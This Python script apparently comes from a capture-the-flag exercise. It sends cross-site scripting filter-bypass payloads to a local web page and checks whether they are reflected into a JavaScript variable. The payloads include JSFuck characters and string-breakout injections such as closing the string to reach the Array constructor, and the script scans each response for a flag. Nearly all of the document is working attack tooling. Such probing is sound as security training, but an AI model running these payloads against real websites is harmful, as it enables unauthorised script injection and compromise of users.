import requests
import re
from urllib.parse import quote

BASE_URL = "http://127.0.0.1:32887/page"

def test_payload(name_value, description):
    """Test a payload and return detailed results"""
    print(f"\n{'='*80}")
    print(f"TEST: {description}")
    print(f"Payload: {name_value}")
    print(f"URL-encoded: {quote(name_value)}")
    
    try:
        response = requests.post(
            BASE_URL,
            data={"name": name_value},
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Content-Length: {len(response.text)} bytes")
        
        # Check if payload is reflected in JavaScript context
        js_match = None
        reflected = None
        
        if 'var userName' in response.text:
            # Extract the JavaScript variable assignment
            js_match = re.search(r'var userName\s*=\s*"([^"]*)"', response.text)
            if js_match:
                reflected = js_match.group(1)
                print(f"Reflected in JS: {reflected}")
                
                # Check if it matches our input (accounting for escaping)
                if name_value in reflected or reflected == name_value:
                    print("✓ PAYLOAD REFLECTED INTACT")
                elif reflected:
                    print(f"✓ PAYLOAD REFLECTED (modified): {reflected}")
                else:
                    print("✗ PAYLOAD BLOCKED (empty reflection)")
            else:
                print("? Could not find userName variable in response")
        
        # Check for filter messages
        if "blocked" in response.text.lower() or "filtered" in response.text.lower():
            print("✗ FILTER MESSAGE DETECTED")
        
        # Look for FLAGS
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"\n🚩 FLAG FOUND: {flag_match.group(0)}")
        
        # Print full response for payloads that might have interesting behavior
        if len(response.text) < 1500 or (reflected and len(reflected) > 0):
            print(f"\nFull Response:\n{response.text}")
        
        return {
            "success": response.status_code == 200,
            "reflected": reflected,
            "response": response.text,
            "status": response.status_code
        }
        
    except Exception as e:
        print(f"✗ ERROR: {e}")
        import traceback
        traceback.print_exc()
        return {"success": False, "error": str(e), "reflected": None}

print("="*80)
print("XSS FILTER BYPASS TESTING - JSFuck & Encoding Techniques")
print("="*80)

# Phase 1: Test JSFuck core characters individually
print("\n\n### PHASE 1: JSFUCK CORE CHARACTERS ###")

jsfuck_chars = [
    ("[", "Square bracket open"),
    ("]", "Square bracket close"),
    ("(", "Parenthesis open"),
    (")", "Parenthesis close"),
    ("!", "Exclamation mark"),
    ("+", "Plus sign"),
    ("[]", "Empty array"),
    ("()", "Empty parentheses"),
    ("[]+()", "Array plus empty parens"),
    ("![]", "Not empty array (false)"),
    ("!![]", "Not not empty array (true)"),
]

jsfuck_results = {}
for char, desc in jsfuck_chars:
    result = test_payload(char, f"JSFuck character: {desc}")
    jsfuck_results[char] = result.get("reflected")

# Phase 2: Test JavaScript property access patterns
print("\n\n### PHASE 2: JAVASCRIPT PROPERTY ACCESS ###")

property_access = [
    ('";[];//', "Break string, empty array, comment"),
    ('";[]();//', "Break string, array and parens, comment"),
    ('";[]["constructor"];//', "Array constructor access"),
    ('";[][[]];//', "Array with computed property"),
    ('";[]+[];//', "Array concatenation"),
    ('";(![])+[];//', "Boolean false to string"),
    ('";(!![])+[];//', "Boolean true to string"),
    ('";[]["length"];//', "Array length property"),
]

property_results = {}
for payload, desc in property_access:
    result = test_payload(payload, desc)
    property_results[payload] = result.get("reflected")

# Summary
print("\n\n" + "="*80)
print("SUMMARY OF RESULTS")
print("="*80)

print("\n### JSFuck Characters Status ###")
for char, reflected in jsfuck_results.items():
    status = "✓ ALLOWED" if reflected is not None else "✗ BLOCKED"
    print(f"{char:20} -> {status} (reflected: {repr(reflected)})")

print("\n### Property Access Status ###")
allowed_property = []
blocked_property = []
for payload, reflected in property_results.items():
    if reflected is not None:
        allowed_property.append(payload)
        print(f"✓ ALLOWED: {payload[:60]} -> {repr(reflected)}")
    else:
        blocked_property.append(payload)
        print(f"✗ BLOCKED: {payload[:60]}")

print("\n" + "="*80)
print("ANALYSIS COMPLETE")
print("="*80)
print(f"\nJSFuck characters allowed: {sum(1 for r in jsfuck_results.values() if r is not None)}/{len(jsfuck_results)}")
print(f"Property access patterns allowed: {len(allowed_property)}/{len(property_results)}")

